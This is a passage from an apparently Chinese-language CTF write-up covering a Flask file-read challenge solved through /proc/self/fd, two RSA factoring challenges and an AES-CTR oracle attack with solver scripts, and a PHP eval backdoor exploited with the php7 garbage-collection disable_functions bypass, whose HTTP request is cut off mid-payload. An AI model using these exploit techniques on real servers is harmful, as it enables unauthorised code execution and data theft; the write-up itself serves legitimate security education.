class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> open<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>存在任意文件读取，flag文件open后被删除，可以读取文件描述符拿到flag</p><pre><code>子目录/proc/self本身就是当前运行进程ID的符号链接.用ls -ld查看/proc/self目录的符号链接,发现每次都不一样,说明我们每次用ls命令时的进程ID都是不同的.ls -ld /proc/self我们查看/proc/self/fd目录下的文件描述符,如下:ls -l /proc/self/fdtotal 0lrwx------ 1 root root 64 2010-10-10 12:16 0 -&gt; /dev/pts/1lrwx------ 1 root root 64 2010-10-10 12:16 1 -&gt; /dev/pts/1lrwx------ 1 root root 64 2010-10-10 12:16 2 -&gt; /dev/pts/1lr-x------ 1 root root 64 2010-10-10 12:16 3 -&gt; /proc/30578/fd文件描述符3,这个描述符是ls进程打开/proc/self/fd(也就是/proc/30578/fd)所得到的文件描述符.</code></pre><pre><code>data=/proc/self/fd/3</code></pre><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> FLAG<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> random<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> int<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">399</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">400</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> int<span class="token punctuation">(</span>str<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"enc"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>p和q都是400位的数,p和q前后200相反</p><p>可以设p=<code>a*pow(10,200)+b</code> q=<code>b*pow(10,200)+a</code></p><p>所以n=<code>a*b*pow(10,400)+a*a*pow(10,200)+b*b*pow(10,200)+a*b</code></p><p>可以将n的前200位和后200位凭借得到 <code>a*b</code></p><p>再用n减去<code>a*b</code>部分得到<code>a*a + b*b</code></p><p>求出a,b后再求出p,q</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> random<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>n<span class="token operator">=</span><span class="token number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span>e <span class="token operator">=</span> <span class="token number">65537</span>nnn1<span class="token operator">=</span>int<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>nnn2<span class="token operator">=</span>int<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ab<span class="token operator">=</span>int<span class="token punctuation">(</span>str<span class="token punctuation">(</span>nnn1<span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>nnn2<span class="token punctuation">)</span><span class="token punctuation">)</span>ab<span class="token operator">=</span><span class="token number">2117306430457495084373744640919209184441085835440785339151821982858580957554648046398035452941253078562547380021066127607547324391257803263684574686690799140082210093930925498879813981907487546461281266736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span>a2b2<span class="token operator">=</span>n<span class="token operator">-</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>ab <span class="token comment" spellcheck="true">#a**2+b**2</span><span class="token comment" spellcheck="true"># print a2b2</span>t<span class="token operator">=</span>a2b2<span class="token operator">/</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print t </span>t1<span class="token operator">=</span>t<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>ab <span class="token comment" spellcheck="true">#(a+b)**2</span><span class="token keyword">print</span> <span class="token string">"(a+b)**2:"</span><span class="token punctuation">,</span>t1 <span class="token comment" spellcheck="true">#(a+b)**2 </span>t2<span class="token operator">=</span>t1<span class="token number">-4</span><span class="token operator">*</span>ab <span class="token comment" spellcheck="true">#(a-b)**2</span><span class="token keyword">print</span> <span class="token string">"(a-b)**2:"</span><span class="token punctuation">,</span>t2 <span class="token comment" spellcheck="true">#(a-b)**2 </span>tt1<span class="token operator">=</span>iroot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"(a+b):"</span><span class="token punctuation">,</span>tt1 <span class="token comment" spellcheck="true">#(a+b)</span>tt2<span class="token operator">=</span>iroot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"(a-b):"</span><span class="token punctuation">,</span>tt2 <span class="token comment" spellcheck="true">#(a-b)</span>b<span class="token operator">=</span><span class="token punctuation">(</span>tt1<span class="token operator">-</span>tt2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>a<span class="token operator">=</span>tt1<span class="token operator">-</span>b<span class="token keyword">print</span> <span class="token string">"b:"</span><span class="token punctuation">,</span>b<span class="token keyword">print</span> <span class="token string">"a:"</span><span class="token punctuation">,</span>a<span class="token keyword">print</span> iroot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> iroot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p <span class="token operator">=</span> a<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token operator">+</span>bq <span class="token operator">=</span> b<span class="token operator">*</span>pow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token keyword">print</span> p<span class="token operator">*</span>q<span class="token operator">==</span>n<span class="token keyword">print</span> <span class="token string">"p"</span><span class="token punctuation">,</span>p<span class="token keyword">print</span> <span class="token string">"q"</span><span class="token punctuation">,</span>qphin <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"d"</span><span class="token punctuation">,</span>dc<span class="token operator">=</span><span class="token number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span>flag <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><p>题目给了enc,n,e</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> FLAG<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>enc <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"enc"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre><p>爆破减去 next_prime的产生的偏移，os.urandom(32)得到的32字节是mod p方程的小根</p><p>已知<code>bytes_to_long(os.urandom(32)*8)</code>会是<code>bytes_to_long((&#39;\x00&#39;*31+&#39;\x01&#39;)*8)</code>的倍数，设<code>t = bytes_to_long((&#39;\x00&#39;*31+&#39;\x01&#39;)*8)</code></p><p>通过小根求出来的r和i=1452，得到p=(r*t+1452)</p><pre class=" language-python"><code class="language-python">c<span class="token operator">=</span><span class="token number">72074917741352632160674674423757226112732503986000125039486711125930276990656443924045288819165868627345704261550380026428346484029915532163917560135274130060403712677039409151760010987858845886090016665156558016254326826349547059132398165597146069935545654906860020446697981554235605548000668071179792369940040506180386344236709376665259555250931229064902253547279742091220081637632484839561818114867753305491466827132794867249268560394596282075249284471959669850300827075751375695495341046098821675671765630616585051408145283934310355450905091174225551852913024234768486683298136180488046648783548871491321003078465957075420450585181898780566907562110082339288183440201802995310694770151937718551875438109333769631500406936973469725930357855181743773516614272920932620803689778201192376634531897671943274986227782204268656867015692338457851232257902297364385868885931304585042560760186518312999852311004441119468693156565576967918680895591024375643850476541598453775623072668482295311781424458452933753379256069914551757794501890946111771992773535292266796984300649540507830481957270227762148818664162360269195888312995110145796745786950401203936544098266440768709581819476569480672433242587899101968249584078375546230742964233750</span>n<span class="token operator">=</span><span class="token number">120807710153113702551615579080626349972702435654213602643278178850601270671946229285821528380336690426317604059622034599839001416930715968066016772516322170847232613450387418879151680919583407733398280475244970196660246303755390654445483988806163997943960045202300170321033632884706732013873256539789027552900587666422370948750842536533923935656875965991272731558533581897633592458155859972323709278905289729445241014357315813048740496355157322217479024997808766708783034169626351658483634985294355975778256304622956911622334081421352132051371869608818591717661111189285407351900021893457439899221542567630909004930602528901255429064258255953091799356807896508016798627878778491866567622281528441807056062152648122769596905617532839645811871242955534491003544450002957748265702306031022676181061669831693628120952508570252446308607118097142440911574131249381253267168309302968966178203572103064042325655007707720847432033652545364390235670894288288369956445797446648862192044259720010703057599068467348014822871417162946598110099990800849922664801383108437169282005803013729663209291895365964487113632471631243676196750054390014101920098216264290734689252677221687512705895162185620154778448467145374612676883160397044672382343419867</span>e <span class="token operator">=</span> <span class="token number">65537</span><span class="token comment" spellcheck="true">#t=bytes_to_long(('\x00'*31+'\x01')*8)</span>t<span class="token operator">=</span><span class="token number">279095111627852376407822673918065072905887935345660252615989519488029661278607405102128022400464439638455553107495480150617094094788936975023785656368021614104516279627798947306932819597906832870520501108138318265206676505430170383360662036167199938418050699923911883462219763725490436725094269168768726436543450648522209474871904285038356744433772896706536844573389567339198101916108364646195478741487548879770224501794968562716466147982037752967369715296218093406259415236879638928189513752126948885802499546144789934871177150534791462913</span>P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span><span class="token punctuation">(</span>x <span class="token operator">*</span>t <span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>beta<span class="token operator">=</span><span class="token number">0.45</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">:</span>        <span class="token keyword">print</span> i<span class="token punctuation">,</span>r</code></pre><p>sage运行得到</p><pre><code>1452 [25097212148084861298779072266686287643405205222520917844564707998487462593163]</code></pre><p>求出p,q，得到flag</p><pre><code>sol = 25097212148084861298779072266686287643405205222520917844564707998487462593163p=(sol*t+1452)print n % pq= n/pphi = (p-1)*(q-1)d = inverse(e, phi)print(long_to_bytes(pow(c, d, n)))#flag{60ea503347a3cdd3181644d07599b7acf97f8382e0376061dc4902776046d43b}</code></pre><h3 id="aes"><a href="#aes" class="headerlink" title="aes"></a>aes</h3><p>题目</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> os<span class="token keyword">import</span> signal<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> Counter<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    ctr <span class="token operator">=</span> Counter<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span>  initial_value<span class="token operator">=</span>sum<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CTR<span class="token punctuation">,</span> counter<span class="token operator">=</span>ctr<span class="token punctuation">)</span>    <span class="token keyword">return</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    signal<span class="token punctuation">.</span>alarm<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'/home/ctf/flag'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">30</span>    enc_flag <span class="token operator">=</span> enc<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the our AES encryption system!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Here is your encrypted flag: {enc_flag}"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            plaintext <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"Please input your plaintext: "</span><span class="token punctuation">)</span>            plaintext <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>            ciphertext <span class="token operator">=</span> enc<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Here is your ciphertext: {ciphertext}"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error!'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Bye~'</span><span class="token punctuation">)</span></code></pre><p>Aes的counter模式<a href="https://www.jianshu.com/p/582d3a47729a" target="_blank" rel="noopener">(CTR)</a></p><p>其中initial_value=sum(msg) ，当我们输入的plaintext满足sum(plaintext)==sum(flag)时，flag ^ encflag == input ^ enc_input，从而求得flag=encflag ^ input ^ enc_input</p><p>flag长度30位 <code>0x20*30</code>从爆破到 <code>0x7f*30</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sys<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true"># for x in range(0x20,0x7f):</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.186.57.123"</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"flag: b"</span><span class="token punctuation">)</span>    enc_flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"enc_flag = "</span><span class="token operator">+</span>enc_flag<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"plaintext: "</span><span class="token punctuation">)</span>        plaintext<span class="token operator">=</span>chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">29</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>x<span class="token operator">+</span>i<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>plaintext<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"ciphertext: b"</span><span class="token punctuation">)</span>        ciphertext <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"ciphertext = "</span><span class="token operator">+</span>ciphertext<span class="token punctuation">)</span>        res <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token operator">^</span>bytes_to_long<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token operator">^</span>bytes_to_long<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> res</code></pre><p>最终<code>sum(flag)</code>在2760到2790之间</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="expass-bypassDF"><a href="#expass-bypassDF" class="headerlink" title="expass(bypassDF)"></a>expass(bypassDF)</h3><p>开局一个后门</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>php垃圾回收<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p>bp的change body encoding可以不用转编码</p><pre class=" language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> <span class="token number">111.186</span><span class="token punctuation">.</span><span class="token number">57.43</span><span class="token punctuation">:</span><span class="token number">10101</span>Pragma<span class="token punctuation">:</span> no<span class="token operator">-</span>cacheCache<span class="token operator">-</span>Control<span class="token punctuation">:</span> no<span class="token operator">-</span>cacheUpgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">.</span><span class="token function">0</span> <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac <span class="token constant">OS</span> X <span class="token constant">10_14_6</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537</span><span class="token punctuation">.</span><span class="token function">36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">78.0</span><span class="token punctuation">.</span><span class="token number">3904.97</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>Connection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">5781</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token number">1608040292</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token number">1608040292</span>Content<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"a"</span>@<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token string">'/readflag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token 